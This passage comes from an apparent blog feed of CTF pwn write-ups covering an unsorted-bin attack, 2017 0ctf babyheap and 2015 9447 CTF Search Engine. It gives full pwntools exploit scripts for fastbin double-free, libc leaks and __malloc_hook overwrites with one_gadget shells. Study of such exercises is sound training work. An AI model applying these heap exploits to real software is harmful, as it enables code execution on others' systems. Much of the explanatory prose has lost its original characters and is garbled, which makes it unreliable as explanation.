io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_heap</span>(<span class="params">size, content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit_heap</span>(<span class="params">idx, size, content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">del_heap</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">create_heap(<span class="number">0x70</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x12</span>)</span><br><span class="line">create_heap(<span class="number">0x90</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x12</span>)</span><br><span class="line">create_heap(<span class="number">0x20</span>,<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x12</span>)</span><br><span class="line">del_heap(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">magic = <span class="number">0x6020c0</span></span><br><span class="line">payload=<span class="string">b&#x27;d&#x27;</span>*<span class="number">0x70</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xa1</span>)+p64(<span class="number">0</span>)+p64(magic-<span class="number">0x10</span>)</span><br><span class="line">edit_heap(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">create_heap(<span class="number">0x90</span>,<span class="string">b&#x27;d&#x27;</span>*<span class="number">0x12</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;4869&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Unsorted Bin Attach </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2017-0ctf-babyheap</title>
      <link href="/2023/03/20/2017-0ctf-babyheap/"/>
      <url>/2023/03/20/2017-0ctf-babyheap/</url>
      
        <content type="html"><![CDATA[<p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/fastbin-attack/2017_0ctf_babyheap">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/fastbin-attack/2017_0ctf_babyheap</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16:~/Desktop/pwn/heap$ checksec babyheap </span><br><span class="line">[*] &#x27;/home/grxer/Desktop/pwn/heap/babyheap&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>init_my&#x2F;dev&#x2F;urandommmapunlink</p><p>allocate()sizemmap</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">00000000</span> chunk           struc ; (<span class="keyword">sizeof</span>=<span class="number">0x18</span>, mappedto_6)</span><br><span class="line"><span class="number">00000000</span> inuse           dq ?</span><br><span class="line"><span class="number">00000008</span> size            dq ?</span><br><span class="line"><span class="number">00000010</span> ptr             dq ?                    ; offset</span><br><span class="line"><span class="number">00000018</span> chunk           ends</span><br></pre></td></tr></table></figure><p>fill()size</p><p>freechunk(),</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">LODWORD(a1[v2].inuse) = <span class="number">0</span>;</span><br><span class="line">a1[v2].size = <span class="number">0LL</span>;</span><br><span class="line"><span class="built_in">free</span>(a1[v2].ptr);</span><br><span class="line">result = (__int64)&amp;a1[v2];</span><br><span class="line">*(_QWORD *)(result + <span class="number">16</span>) = <span class="number">0LL</span>;</span><br></pre></td></tr></table></figure><h2 id="unsort-binlibc"><a href="#unsort-binlibc" class="headerlink" title="unsort binlibc"></a>unsort binlibc</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">allocate(<span class="number">0x10</span>)  <span class="comment"># idx 0, 0x00</span></span><br><span class="line">allocate(<span class="number">0x10</span>)  <span class="comment"># idx 1, 0x20</span></span><br><span class="line">allocate(<span class="number">0x10</span>)  <span class="comment"># idx 2, 0x40</span></span><br><span class="line">allocate(<span class="number">0x10</span>)  <span class="comment"># idx 3, 0x60</span></span><br><span class="line">allocate(<span class="number">0x80</span>)  <span class="comment"># idx 4, 0x80</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">payload = <span class="number">0x10</span> * <span class="string">b&#x27;a&#x27;</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p8(<span class="number">0x80</span>)</span><br><span class="line">fill(<span class="number">0</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line">payload = <span class="number">0x10</span> * <span class="string">b&#x27;b&#x27;</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line">allocate(<span class="number">0x10</span>)</span><br><span class="line">allocate(<span class="number">0x10</span>)</span><br><span class="line">payload = <span class="number">0x10</span> * <span class="string">b&#x27;c&#x27;</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line">allocate(<span class="number">0x80</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">dump(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p></p><p><img src="/2023/03/20/2017-0ctf-babyheap/image-20230817100944060.png" alt="image-20230817100944060"></p><p>free(2)free(1)</p><p><img src="/2023/03/20/2017-0ctf-babyheap/image-20230320103408525.png" alt="image-20230320103408525"></p><p>chunk0chunk11fd4kchunk2chunk40x80</p><p><code>payload = 0x10 * b&#39;a&#39; + p64(0) + p64(0x21) + p8(0x80)</code></p><p><img src="/2023/03/20/2017-0ctf-babyheap/image-20230320103540783.png" alt="image-20230320103540783"></p><p>chunk4fastbin0x20</p><p>chunk3<code>payload = 0x10 * b&#39;b&#39; + p64(0) + p64(0x21)</code></p><p>allocate(0x10)<br>allocate(0x10)</p><p>chunk2chunk4</p><p>chunk4unsorted binchunk4topchunkchunk40x91unsortedbinchunk2unsortbin</p><p><img src="/2023/03/20/2017-0ctf-babyheap/image-20230817101003145.png" alt="image-20230817101003145"></p><p>libc</p><h2 id="chunk-malloc-hook"><a href="#chunk-malloc-hook" class="headerlink" title="chunk malloc_hook"></a>chunk malloc_hook</h2><p>chunk2chunk4datachunk4fastbinmallocchunk4unsortbin</p><p>ptmalloc2<strong>fastbinchunkunsorted bin</strong></p><blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="type">void</span>* x = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//topchunk</span></span><br><span class="line">    <span class="built_in">free</span>(x);</span><br><span class="line">    <span class="type">void</span>* y = <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc -g -o test test.c</span></span><br></pre></td></tr></table></figure><p>malloc(0x10)</p><p><img src="/2023/03/20/2017-0ctf-babyheap/image-20230320111817704.png" alt="image-20230320111817704"></p><p>free(x)</p><p><img src="/2023/03/20/2017-0ctf-babyheap/image-20230817101021289.png" alt="image-20230817101021289"></p><p>void* y &#x3D; malloc(0x60);</p><p><img src="/2023/03/20/2017-0ctf-babyheap/image-20230817101219838.png" alt="image-20230817101219838"></p><p></p></blockquote><p><img src="/2023/03/20/2017-0ctf-babyheap/image-20230320103948398.png" alt="image-20230320103948398"></p><p>0x7f0x60chunk</p><p>allocate(0x60) #idx4<br>free(4)</p><p>fakechunk</p><p>ake_chunk_addr &#x3D; main_arena - 0x33<br>fake_chunk &#x3D; p64(fake_chunk_addr)<br>fill(2, len(fake_chunk), fake_chunk)</p><p><img src="/2023/03/20/2017-0ctf-babyheap/image-20230320112319902.png" alt="image-20230320112319902"></p><p>allocate(0x60)  # idx 4<br>allocate(0x60)  # idx 6</p><p>chunk</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax == NULL</span><br><span class="line"></span><br><span class="line">0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x30] == NULL</span><br><span class="line"></span><br><span class="line">0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x50] == NULL</span><br><span class="line"></span><br><span class="line">0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br></pre></td></tr></table></figure><p>onegadget</p><p>one_gadget_addr &#x3D; libc + 0x4526a<br>payload &#x3D; 0x13 * ba + p64(one_gadget_addr)<br>fill(6, len(payload), payload)</p><p></p><p><img src="/2023/03/20/2017-0ctf-babyheap/image-20230320110015505.png" alt="image-20230320110015505"></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./babyheap&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="string">&#x27;28529&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allocate</span>(<span class="params">size</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Command: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Size: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fill</span>(<span class="params">idx, size, content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Command: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Size: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Command: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Command: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">allocate(<span class="number">0x10</span>)  <span class="comment"># idx 0, 0x00</span></span><br><span class="line">allocate(<span class="number">0x10</span>)  <span class="comment"># idx 1, 0x20</span></span><br><span class="line">allocate(<span class="number">0x10</span>)  <span class="comment"># idx 2, 0x40</span></span><br><span class="line">allocate(<span class="number">0x10</span>)  <span class="comment"># idx 3, 0x60</span></span><br><span class="line">allocate(<span class="number">0x80</span>)  <span class="comment"># idx 4, 0x80</span></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">payload = <span class="number">0x10</span> * <span class="string">b&#x27;a&#x27;</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p8(<span class="number">0x80</span>)</span><br><span class="line">fill(<span class="number">0</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">payload = <span class="number">0x10</span> * <span class="string">b&#x27;b&#x27;</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line">allocate(<span class="number">0x10</span>) <span class="comment">#idx 1</span></span><br><span class="line">allocate(<span class="number">0x10</span>) <span class="comment">#idx 2</span></span><br><span class="line">payload = <span class="number">0x10</span> * <span class="string">b&#x27;c&#x27;</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line">allocate(<span class="number">0x80</span>)<span class="comment"># idx5</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">dump(<span class="number">2</span>)</span><br><span class="line">ru(<span class="string">b&#x27;Content: \n&#x27;</span>)</span><br><span class="line">unsortbin_addr = u64(io.recv(<span class="number">8</span>))</span><br><span class="line">main_arena=unsortbin_addr-<span class="number">88</span></span><br><span class="line">libc=main_arena-<span class="number">0x3C4B20</span></span><br><span class="line">p(<span class="string">&#x27;libc&#x27;</span>,libc)</span><br><span class="line">allocate(<span class="number">0x60</span>) <span class="comment">#idx4</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">fake_chunk_addr = main_arena - <span class="number">0x33</span></span><br><span class="line">fake_chunk = p64(fake_chunk_addr)</span><br><span class="line">fill(<span class="number">2</span>, <span class="built_in">len</span>(fake_chunk), fake_chunk)</span><br><span class="line">allocate(<span class="number">0x60</span>)  <span class="comment"># idx 4</span></span><br><span class="line">allocate(<span class="number">0x60</span>)  <span class="comment"># idx 6</span></span><br><span class="line">one_gadget_addr = libc + <span class="number">0x4526a</span></span><br><span class="line">payload = <span class="number">0x13</span> * <span class="string">b&#x27;a&#x27;</span> + p64(one_gadget_addr)</span><br><span class="line">fill(<span class="number">6</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line">gdb.attach(io)</span><br><span class="line"></span><br><span class="line">allocate(<span class="number">0x100</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Unsorted Bin Leak </tag>
            
            <tag> Malloc Hook </tag>
            
            <tag> Split Chunk </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Arbitrary Alloc 2015 9447 CTF:Search Engine</title>
      <link href="/2023/03/19/2015-9447-CTF-Search-Engine/"/>
      <url>/2023/03/19/2015-9447-CTF-Search-Engine/</url>
      
        <content type="html"><![CDATA[<p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/fastbin-attack/2015_9447ctf_search-engine">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/fastbin-attack/2015_9447ctf_search-engine</a></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 ~/D/p/heap&gt; checksec search </span><br><span class="line">[*] <span class="string">&#x27;/home/grxer/Desktop/pwn/heap/search&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No <span class="title function_">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span></span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><p>gdb</p><p>index_sentence()sizesentencecontentsentence0x6020B8</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">00000000</span> word_struct     struc ; (<span class="keyword">sizeof</span>=<span class="number">0x28</span>, mappedto_6)</span><br><span class="line"><span class="number">00000000</span> content         dq ?</span><br><span class="line"><span class="number">00000008</span> size            dd ?</span><br><span class="line"><span class="number">0000000</span>C padding1        dd ?</span><br><span class="line"><span class="number">00000010</span> sentence_ptr    dq ?                 ; offset</span><br><span class="line"><span class="number">00000018</span> len             dd ?</span><br><span class="line"><span class="number">0000001</span>C padding2        dd ?</span><br><span class="line"><span class="number">00000020</span> next            dq ?                    ; offset</span><br><span class="line"><span class="number">00000028</span> word_struct     ends</span><br></pre></td></tr></table></figure><p>heap manger0x30chunk</p><p>search_word()<code>i-&gt;size == num &amp;&amp; !memcmp(i-&gt;content, v1, num)</code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">memset</span>(i-&gt;sentence_ptr, <span class="number">0</span>, i-&gt;len);</span><br><span class="line"><span class="built_in">free</span>(i-&gt;sentence_ptr);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Deleted!&quot;</span>);</span><br></pre></td></tr></table></figure><p>freenullstruct</p><h2 id="unsorted-binlibc"><a href="#unsorted-binlibc" class="headerlink" title="unsorted binlibc"></a>unsorted binlibc</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">smallbin_sentence = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x85</span> + <span class="string">&#x27; b&#x27;</span></span><br><span class="line">index_sentence(smallbin_sentence)</span><br><span class="line">search_word(<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">search_word(<span class="string">b&#x27;\x00&#x27;</span>)</span><br></pre></td></tr></table></figure><p>sentenceword b-&gt;a*0x85search(b)sentencechunk0x90fastbinunsortbinunsorted binchunkfdbkunsortedbin</p><p><img src="/2023/03/19/2015-9447-CTF-Search-Engine/image-20230319221406963.png" alt="image-20230319221406963"></p><p>__search,<code>if ( *i-&gt;sentence_ptr )</code>i-&gt;sentence_ptrsentence chunkfdunsorted bin__<code>i-&gt;size == num &amp;&amp; !memcmp(i-&gt;content, v1, num)</code>size1memset(i-&gt;sentence_ptr, 0, i-&gt;len)0,<code>fwrite(i-&gt;sentence_ptr, 1uLL, i-&gt;len, stdout);</code>bkfd</p><p>unsorted binmain_arena,main_arenaglibc0x3C4B20libc</p><h2 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h2><p>freedoublefree</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">index_sentence(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x5e</span> + <span class="string">b&#x27; d&#x27;</span>)</span><br><span class="line">index_sentence(<span class="string">b&#x27;b&#x27;</span> * <span class="number">0x5e</span> + <span class="string">b&#x27; d&#x27;</span>)</span><br><span class="line">index_sentence(<span class="string">b&#x27;c&#x27;</span> * <span class="number">0x5e</span> + <span class="string">b&#x27; d&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">search_word(<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;y&#x27;</span>)</span><br></pre></td></tr></table></figure><p>freea-&gt;b-&gt;c-&gt;0</p><p><img src="/2023/03/19/2015-9447-CTF-Search-Engine/image-20230319234446142.png" alt="image-20230319234446142"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">io.recvuntil(<span class="string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;y&#x27;</span>)  <span class="comment">#b</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;n&#x27;</span>)  <span class="comment">#a</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Delete this sentence (y/n)?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;n&#x27;</span>)  <span class="comment">#first chunk</span></span><br></pre></td></tr></table></figure><p>freecif ( *i-&gt;sentence_ptr )chunkfastbinfdfd0</p><p>bb-&gt;fdaafdb</p><p><img src="/2023/03/19/2015-9447-CTF-Search-Engine/image-20230817100848581.png" alt="image-20230817100848581"></p><h2 id="-Arbitrary-Alloc-and-malloc-hook"><a href="#-Arbitrary-Alloc-and-malloc-hook" class="headerlink" title=" Arbitrary Alloc and malloc hook"></a> Arbitrary Alloc and malloc hook</h2><p>fakechunk</p><p>main_arenamallochookmalloc__hookmain_arean0x10</p><p><img src="/2023/03/19/2015-9447-CTF-Search-Engine/image-20230320000552113.png" alt="image-20230320000552113"></p><p>find_fake_fastchunk</p><p><img src="/2023/03/19/2015-9447-CTF-Search-Engine/image-20230320000725835.png" alt="image-20230320000725835"></p><p><img src="/2023/03/19/2015-9447-CTF-Search-Engine/image-20230320000936214.png" alt="image-20230320000936214"></p><p>fakechunkmain_arean-0x33</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">#<span class="meta">#<span class="keyword">define</span> fastbin_index(sz)                                                      \</span></span><br><span class="line"><span class="meta">    ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span></span><br></pre></td></tr></table></figure><p>0x7f fastbin_index50x70chunkfastbinfreechunk0x700x600x60fakechunk</p><table><thead><tr><th>fastbinsY[]</th><th>x86size_t&#x3D;4</th><th>x64size_t&#x3D;8</th></tr></thead><tbody><tr><td>0</td><td>0x10</td><td>0x20</td></tr><tr><td>1</td><td>0x18</td><td>0x30</td></tr><tr><td>2</td><td>0x20</td><td>0x40</td></tr><tr><td>3</td><td>0x28</td><td>0x50</td></tr><tr><td>4</td><td>0x30</td><td>0x60</td></tr><tr><td>5</td><td>0x38</td><td>0x70</td></tr><tr><td>6</td><td>0x40</td><td>0x80</td></tr></tbody></table><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fakechunk=main_arena-<span class="number">0x33</span></span><br><span class="line">fake_chunk = p64(fakechunk).ljust(<span class="number">0x60</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">index_sentence(fake_chunk)</span><br></pre></td></tr></table></figure><p>bbfdfakechunk</p><p><img src="/2023/03/19/2015-9447-CTF-Search-Engine/image-20230320002318652.png" alt="image-20230320002318652"></p><p>0x60chunkfakechunk</p><p>fakechunkmalloc_hook0x23,fakechunk+0x100x13padding</p><p>onegadget</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/Desktop&gt; one_gadget ./libc-2.23.so </span><br><span class="line">0x45226 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax == NULL</span><br><span class="line"></span><br><span class="line">0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x30] == NULL</span><br><span class="line"></span><br><span class="line">0xf03a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x50] == NULL</span><br><span class="line"></span><br><span class="line">0xf1247 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">index_sentence(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x60</span>)</span><br><span class="line">index_sentence(<span class="string">b&#x27;b&#x27;</span> * <span class="number">0x60</span>)</span><br><span class="line">one_gadget_addr = libc + <span class="number">0xf1247</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x13</span> + p64(one_gadget_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x60</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">index_sentence(payload)</span><br></pre></td></tr></table></figure><p>shell,</p><p><img src="/2023/03/19/2015-9447-CTF-Search-Engine/image-20230320003959634.png" alt="image-20230320003959634"></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./search&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(<span 